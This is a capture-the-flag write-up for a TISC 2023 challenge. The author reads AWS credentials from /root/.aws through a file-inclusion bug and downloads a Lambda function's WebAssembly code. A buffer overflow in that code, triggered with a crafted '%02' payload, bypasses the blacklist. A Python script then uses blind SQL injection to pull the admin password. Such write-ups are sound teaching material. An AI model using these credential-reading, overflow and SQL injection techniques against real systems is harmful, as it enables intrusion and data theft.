Opening the site, I am greeted with a login page. I tried some sql injection payloads but they were blocked by a blacklist. Hence, I wrote a quick python script to fuzz all allowed characters, and got: `"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"`. Obviously, sql injection is not possible with only alphabets, so we need to find something else. I looked at the source code provided.

I saw there was a LFI vulnerability in server.js:

```javascript:server.js
app.post('/api/submit-reminder', (req, res) => {
    const username = req.body.username;
    const reminder = req.body.reminder;
    const viewType = req.body.viewType;
    res.send(pug.renderFile(viewType, { username, reminder }));
});
```

Looking at the Dockerfile, it seems that there is a aws config folder at `/root/.aws`. Hence, we can access the credentials by sending a post request to `/api/submit-reminder` with viewType as `/root/.aws/credentials`. This is the response:

![](/blind-sql-injection-0.png)

I set the credentials using `aws configure`.

To list the permissions available, I tried using the `getUserIamPermissions.sh` script from level 7, however it didn't work because the credentials did not have the necessary permissions.

However, there is a lambda function invocation of `craft_query` in the code, hence I deduced that I would be able to get the function. I ran `aws lambda get-function --function-name craft_query`. This returned a large json response with a link to the code:

```json
...

  "Code": {
    "RepositoryType": "S3",
    "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/craft_query-a989953b-8c24-41f0-ac22-813b4ca32bbc?versionId=JNLr5qtX.LFHg63fpryY.eZVBru5aTvH&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECQaDmFwLXNvdXRoZWFzdC0xIkgwRgIhAPWbYE%2FW7LQeM1c%2BY6GZjL4i4%2BRBpUJOc1xIARN7vDOPAiEA83kkf81hFV2K4SfoFT2q70i2%2Bs95HxJ1cb7IuCAxb5AqwAUILRAEGgwyOTUzMzg3MDM1ODMiDMeA9zfqSUVUNA1frSqdBd5TVP2%2FlOom3eVELxgmxgyQLxQ7lr0CBpEg3lI%2B%2F5wILSzWB9E8BYSEuDSQOlYKArG6LE2jdXcEsXm2PGXe3pK%2F97GvZGOiIJrdVRfKVW9Y%2FZYerD1X6inPYz1u%2BmvVDhZZYzm7umrwNNOybY2A0GjXt7uUUxOy16Gy8GuZExynIEEYeC81%2BBMA6ieLn8osUGDDh%2BAfSj9vWV56YlKz2qI4DTNaz7%2BbVxCYLXr3sIL%2FPN%2BnXq1xF6M6sWbtFnYw58t6Duf5W1gBI%2BGp5EnDXlVbRQrTqo4A6xZVoTEe5B6iGNJq629qEjUZvah4lafSIqqV6MLnoSf5K1tLAJSvQmDGirbHx%2F6B85tC5gEfP9WZlFaKhdOoJWQBOypyu6LzfUld6TOK1ZssoJVED3p211j4mk4lCQp6trcRkPaWJnLGmH5YrJ40wmsWjcTQpM5JpIUWxNcDinWDlAP5cjwLpjk3sy5FExeRYH%2B6%2FRrR1NuJCevzOcXc1Xblnn%2FWNDM8I3GDxHAgRZLLyV3MiJkhmJLt0w4eSTAdOSnXskRzhJiwXu11yQAsbJIb58ZkXf3hHarIg6jgYMreSStiatH3bSRFtqEowEKPtMGwyMYgMNu4ZzQM%2Fc7GruI1aWQWgwrmwxTmaJTQ1k4mSVqCuKUxU%2F2KVmdoCeUq3%2F0yXGSMsWv30SH8tFVt4sSxFNQSHwrhaJBIaclVAbpRPkwxOwK04cC6oUOuzJBAfTZV7NIAW0rFcPelO1qnOFnGaXEA1P0TnEJ5ZAAsz7hnEi3GUM1PPYvdpN6FA2KbvDvU7i%2BKpFfiUA%2BTiRY0QbpeN9dXT9KDJrMDDjL4903hWqyQOEqLletQKQU%2Bmz%2FDm%2Bmtw6xOf8%2FGYdV4M3sNJu0VkQIJXDCJgPCoBjqwAdcXEkuE%2BsHOCZjSNqyj7Dx89h%2FbJO2Y%2Brtit8QmiInVu5rkvoIia9rrC%2FNUa3APGV1t1Iskn3NyxsywLXl1rkvC7ONpkrbfH%2FUwzxzxVVJ6fO76u9zsDdpZXg8MLWwzhOYb%2BtSG9FrJn4VwkMVr4MZmykXsKP%2BkeNBaYWdboV3R8vghydMTjNhG2kMSrcvDUSHT0DD7UckOH0wvN3xvRW97vk3phBssxvVpwWAzajN7&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20231003T124953Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LP4VD3LLND%2F20231003%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=06d27d9e23c01d8a7e9ab9fb19dd185864028bd5ffa623ab301e5d471ba05f41"
  }

...
```

Clicking the link downloaded a zip file, which when extracted gave 3 files: `index.js`, `site.js`, and `site.wasm`.

It seems that `index.js` and `site.js` are just used to connect the webassembly binary to the lambda function, and the main logic is in the binary. At this point, I did some reading up on webassembly exploitation before continuing, since I had no prior experience with it.

I disassembled the binary using `wasm-decompile`, and wrote a quick script to inline variables since the decompiled output contained a lot of "un-inlined constants". Here is the script:

```python:cleaner.py
from collections import namedtuple
import re


def consume_identifier(line, i):
    start = i
    while i < len(line) and (line[i].isalpha() or line[i] == '_'):
        i += 1
    return i, line[start:i]


def all_remaining_identifiers(line, i):
    names = []
    while i < len(line):
        while i < len(line) and not (line[i].isalpha() or line[i] == '_'):
            i += 1
        if i >= len(line):
            break

        name_i = i
        i, name = consume_identifier(line, i)
        names.append((name, name_i, i))
    return names


class Expr:
    def __init__(self, expr, used_vars, can_be_removed):
        self.expr = expr
        self.used_vars = used_vars
        self.can_be_removed = can_be_removed
    def __repr__(self):
        return 'Expr({!r}, {!r}, {!r})'.format(self.expr, self.used_vars, self.can_be_removed)


def clean_function(lines):
    redundant_vars = {}
    exprs_to_replace = []
    cleaned_lines = [line for line in lines]
    assignments = []
    num_usages = {}


    for line_no, line in enumerate(lines):
        i = 0
        while line[i] == ' ':
            i += 1
        
        if line[i:].startswith('var ') and ' = ' in line:
            i += 4
            i, name = consume_identifier(line, i)
            expression = line.split(' = ')[1][:-2]  # remove ;\n
            if not re.search(r'[a-zA-Z_]\(', expression):
                # check that does not contain a function call
                # if has a function call, cannot move it
                used_vars = all_remaining_identifiers(expression, 0)
                redundant_vars[name] = Expr(expression, used_vars, True)
                assignments.append((line_no, name))

        elif ' = ' in line:
            # reassignment
            i, name = consume_identifier(line, i)
            if name in redundant_vars:
                redundant_vars[name].can_be_removed = False

        used_vars = all_remaining_identifiers(line, 0)
        for name, _, _ in used_vars:
            num_usages[name] = num_usages.get(name, 0) + 1
        exprs_to_replace.append((line_no, used_vars))


    def clean_expr(expr):
        expr_s = expr.expr
        for name, start, end in reversed(expr.used_vars):
            if name in redundant_vars and redundant_vars[name].can_be_removed:
                expr_s = expr_s[:start] + clean_expr(redundant_vars[name]) + expr_s[end:]
        if ' ' in expr_s:
            expr_s = '(' + expr_s + ')'
        return expr_s


    for line_no, used_vars in reversed(exprs_to_replace):
        i = cleaned_lines[line_no].find(' = ') + 3
        for name, start, end in reversed(used_vars):
            if name in redundant_vars and redundant_vars[name].can_be_removed:
                cleaned_lines[line_no] = cleaned_lines[line_no][:start] + clean_expr(redundant_vars[name]) + cleaned_lines[line_no][end:]
                num_usages[name] -= 1

    for line_no, name in reversed(assignments):
        if num_usages[name] < 0:
            print('ERROR:', name)
        if num_usages[name] == 0:
            cleaned_lines.pop(line_no)

    return cleaned_lines


def main():
    with open('site.dcmp') as f:
        lines = f.readlines()
    
    i = 0
    while i < len(lines):
        if lines[i].startswith('function ') or lines[i].startswith('export function '):
            end_i = lines.index('}\n', i)
            cleaned_lines = clean_function(lines[i+1:end_i])
            lines = lines[:i+1] + cleaned_lines + lines[end_i:]
            i += len(cleaned_lines) + 1
        i += 1

    with open('out.dcmp', 'w') as f:
        f.write(''.join(lines))

main()
```

Essentially, it converts code like 

```
var c:int = g_a;
var d:int = 160;
var e:int = c - d;
```

to

```
var e:int = g_a - 160;
```

where c and d variables are not used anywhere else. Now, the code was a bit more readable. Here is the updated craft_query function:

```
export function craft_query(username:int, password:int):int {
	var e:int = DATA - 160;
	DATA = e;
	e[39]:int = username;
	e[38]:int = password;
	e[37]:int = 1;
	e[3]:int = 1;
	e[2]:int = 2;
	f_1(e + 80, e[39]:int);
	f_2(e + 16, e[38]:int, 59);
	e[75]:byte = 0;
	var z:int = call_indirect(e + 80, e + 16, e[37]:int);
	DATA = e + 160;
	return z;
}
```

Next, I looked at the function `f_1`.

```
function f_1(ptr:int, username:int) {
	var e:int_ptr = DATA - 32;
	DATA = e;
	e[7] = ptr;
	e[6] = username;
	loop L_b {
		if (eqz((e[6][0] & 255 != 0) & 1)) goto exit;
		if (eqz(((e[6][0] << 24) >> 24 == 37))) goto B_d;  # %
		var fa:int = hex_to_int(((e[6][1] << 24) >> 24));
		e[5] = fa;
		var la:int = hex_to_int(((e[6][2] << 24) >> 24));
		e[4] = la;
		if (eqz(((e[5] != -1) & 1))) goto B_f;
		if (eqz(((e[4] != -1) & 1))) goto B_f;
		e[3] = ((e[5] << 4) + e[4]);
		e[6] = (e[6] + 3);
		utf8encoding(e[7], e[3]);
		var lb:int = strlen(e[7]);
		e[7] = (e[7] + lb);
		goto B_e;
		label B_f:
		e[6] = (e[6] + 1);
		var sb:byte_ptr = e[7];
		e[7] = (sb + 1);
		sb[0] = e[6][0];
		label B_e:
		goto B_c;
		label B_d:
		e[6] = (e[6] + 1);
		var zb:byte_ptr = e[7];
		e[7] = (zb + 1);
		zb[0] = e[6][0];
		label B_c:
		continue L_b;
	}
	unreachable;
	label exit:
	e[7][0] = 0;
	DATA = e + 32;
}
```

I analysed the functions `hex_to_int`, `utf8encoding` and `strlen` by reading the code, and I renamed them accordingly. So the function seems to be copying all the bytes in username to a buffer, and it provides url decoding.

Next, I needed to setup a work environment so I could test the wasm binary. After trying various tools unsuccessfully, I eventually just modified `index.js` to run the function and print the result:

```javascript:index.js
...

(async () => {
  CraftQuery = await initializeModule();
  const result = CraftQuery('A', 'B');
  console.log(result);
})();
```

This produced `SELECT * from Users WHERE username="A" AND password="B"` as expected. I now tried to test for a buffer overflow. Passing `"A".repeat(100)` as the username gave a `memory access out of bounds` error - a sign there was indeed some buffer overflow.

Using binary search, I narrowed it down to 67 characters, and passing an additional character gave a `null function or function signature mismatch` error. I needed to inspect the state of the memory, hence I wrote the memory buffer to a file:

```javascript:index.js
...

(async () => {
  CraftQuery = await initializeModule();
  const result = CraftQuery('A'.repeat(67), 'B');
  console.log(result);
  require('fs').writeFileSync('mem.bin', Buffer.from(EmscriptenModule.asm.memory.buffer));
})();
```

Additionally, I added similar code to `site.js` so that a memory dump would be produced in event of an error:

```javascript:site.js
...

process.on('uncaughtException', (ex) => {
  // suppress ExitStatus exceptions from showing an error
  if (ex !== 'unwind' && !(ex instanceof ExitStatus) && !(ex.context instanceof ExitStatus)) {
    require('fs').writeFileSync('mem.bin', Buffer.from(wasmMemory.buffer));
    throw ex;
  }
});

...
```

I wrote a python script to then inspect the memory:

```python:ex_mem.py
with open('mem.bin', 'rb') as f:
    data = f.read()

i = data.find(b'A'*67)
print(i)
print(data[i-100:i+100])
```

This gave the output:

```
65360
b'P\xff\x00\x00\x00\x00\x00\x00\x10\xff\x00\x00P\xff\x00\x00`\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x01\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
```

It seems that right after the list of As there is a 0x1 byte. The memory dump from passing 68 As as the argument shows that this byte is overwritten by a null byte.

```
65360
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf4\xff\x00\x00\x94\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
```

I reasoned that this null byte was written to indicate the end of string. Looking at the error message produced, `null function or function signature mismatch`, I postulated that the 0x1 was referring to an entry in the webassembly function table. I listed the entries in this table with the code:

```javascript:site.js
...

  const table = EmscriptenModule.asm.__indirect_function_table;
  console.log(table.length);
  for (let i = 0; i < table.length; i++) {
    console.log(table.get(i));
  }

...
```

```plaintext:output
null
[Function: 8]
[Function: 6]
[Function: 40]
[Function: 41]
[Function: 44]
```

To determine what functions these correspond to, I ran `wasm2wat site.wasm -o site.wat` and found the following:

```plaintext:site.wat
...

  (export "__wasm_call_ctors" (func 1))
  (export "load_query" (func 6))
  (export "is_blacklisted" (func 8))
  (export "craft_query" (func 9))

...
```

So the function in table entry 1 is `is_blacklisted`, and the function in table entry 2 is `load_query`. Looking at the code, it seems that `is_blacklisted` checks if there are any blacklisted characters used, and if not it calls `load_query`, which seems to return the final sql query. So by overwriting the 0x1 byte with 0x2, we can bypass the blacklist! Also, we can use the url decoding method to write the 0x2 byte.

I ran the function with blacklisted characters: `CraftQuery('"'.repeat(68) + '%02', 'B')`, and sure enough, the blacklist was bypassed.

```
SELECT * from Users WHERE username="""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" AND password="B"
```

Now we have sql injection. Referring to the `db-init.sql` file provided, I saw that we needed to get the password of the admin. Unfortunately however, server.js does not give us the results of the sql query.

```javascript:server.js
...

db.query(sql, (err, results) => {
    if (err) {
        req.flash('error', 'Uh oh. Something went wrong.');
        req.session.save(() => {
            res.redirect('/');
        });
    } else if (results.length !== 0) {
        res.redirect(`/reminder?username=${username}`);
    } else {
        req.flash('error', 'Invalid username/password');
        req.session.save(() => {
            res.redirect('/');
        });
    }
});

...
```

Fortunately, though, it does provide us with information on whether 0 rows were returned by the query. We can extract the flag character by character, for example, using a query such as `admin" and binary substring(password, 1, 1) = "T";#` to check whether the first character is `T`, and we check through all possible characters for each index.

Here is my final solve script:

```python:s.py
import requests
import subprocess
from string import ascii_letters, digits

possible = ascii_letters + digits + '_'

url = 'http://chals.tisc23.ctf.sg:28471/api/login'

j = 6
ans = 'TISC{'
while True:
    for c in possible:
        print(str(j) + ': trying ' + c)
        pay0 = f'admin" and binary substring(password, {j}, 1) = "{c}";#'
        pay1 = pay0
        pay1 += 'A' * (68 - len(pay0)) + '%02'

        i = 1
        correct = False
        while True:
            if i % 50 == 0:
                print(i)
            resp = requests.post(url, data={'username': pay1, 'password': 'B'})
            if ('Something went wrong' not in resp.text):
                if 'Welcome, admin' in resp.text:
                    correct = True
                elif 'Invalid username/password' in resp.text:
                    correct = False
                else:
                    print('Unexpected result:')
                    print(resp.text)
                    import sys; sys.exit(1)
                break
            i += 1
        
        if correct:
            ans += c
            print(ans)
            j += 1
            break
    
    else:
        print('failed at:', j)
        break
```

Notice the second `while True` loop in sending the request. This was because results from the lambda function were very inconsistent, and invoking the lambda function twice would give different results, so I had to keep trying until the correct sql query was returned. This was why I also added a lot of print statements throughout, so I would not lose progress in event of an error.

Eventually however, I get the flag: `TISC{a1PhAb3t_0N1Y}`